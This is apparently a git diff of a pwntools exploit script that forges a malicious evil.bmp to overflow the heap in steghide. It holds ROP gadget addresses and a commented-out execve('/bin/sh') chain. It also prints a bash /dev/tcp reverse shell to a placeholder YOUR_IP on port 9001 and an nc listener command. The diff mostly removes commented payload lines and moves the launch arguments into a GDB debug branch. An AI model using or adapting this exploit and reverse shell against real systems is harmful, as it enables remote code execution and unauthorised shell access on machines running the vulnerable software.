@@ -56,9 +56,6 @@ bmp += p32(0)            # Important color count
 # ==========================================
 # Phase 2: The Heap Smash Payload
 # ==========================================
-# Because the program allocated 0 bytes for the vector, 
-# all 5,000 of these bytes will bleed directly onto the heap!
-# payload = b'a'*3067
 
 mov_rax = 0x000000000040db3e # mov rax, rdx ; pop rbp ; ret
 pop_rdi = 0x0000000000450e8b
@@ -67,41 +64,8 @@ pop_rsi = 0x0000000000417f3e
 syscall = 0x00000000004066b3
 
 
-# 0x000000000040c8b3 : 
 mov_rsi_rax = 0x000000000041c58e #  mov rsi, rax ; mov rdi, r13 ; call r14
 pop_13_14_rbp = 0x000000000041bd45 #  pop r13 ; pop r14 ; pop rbp ; rety
-pop_r12_rbp = 0x0000000000406197 # pop r12 ; pop rbp ; ret
-mov_rdi = 0x000000000041bee3  # : mov rdi, rax ; call rdx
-pop_pad = 0x447411 #  pop rbx ; pop rbp ; ret
-# 3071
-#0xc00
-# 0xbf8
-# bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'\x00
-# payload = flat(
-#     # b"bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'\x00",
-#     b'/bin/sh\0',
-#     # b'e'*0xbc8,
-#     b'e'*0xbf0,
-#     pop_rdx,
-
-#     pop_pad,
-#     mov_rdi, 
-#     0,
-    
-#     pop_rdx,
-#     0x3b,
-#     mov_rax,
-#     0,
-
-#     pop_rdx,
-#     0,
-#     pop_rsi,
-#     0,
-#     syscall
-
-# )
-
-# payload = payload.ljust(0xc08, b'c')
 
 bss = 0x48a080
 memcpy = 0x41B363
@@ -159,13 +123,7 @@ log.info("Forged evil.bmp successfully!")
 # Phase 3: Execution
 # ==========================================
 # Tell steghide to analyze our malicious file
-# argv = [exe.path, b'info', b'evil.bmp', b'-p', b'']
-argv = [exe.path, 
-        b'extract', 
-        b'-sf', b'evil.bmp' ,
-        b'-p', b'ls', 
-        b'-xf', b'dummy.txt']
-# Launch in GDB so we can catch the exact moment the heap dies
+
 
 #########################################
 ### create local host:  nc -lvnp 9001 ###
@@ -204,6 +162,11 @@ if args.REMOTE:
         log.error(f"Connection failed: {e}")
 else:
     # p = process(argv)
+    argv = [exe.path, 
+        b'extract', 
+        b'-sf', b'evil.bmp' ,
+        b'-p', b'ls', 
+        b'-xf', b'dummy.txt']
 
     p = gdb.debug(argv, gdbscript='''
         # b*0x41EDBA     
@@ -217,8 +180,8 @@ else:
         # b*0x4176EB
         # b*0x4176F6 
         # b*_Unwind_RaiseException+387
-        b*_Unwind_RaiseException
+        # b*_Unwind_RaiseException
         c
     ''')
-
-p.interactive()
+    p.interactive()
+    
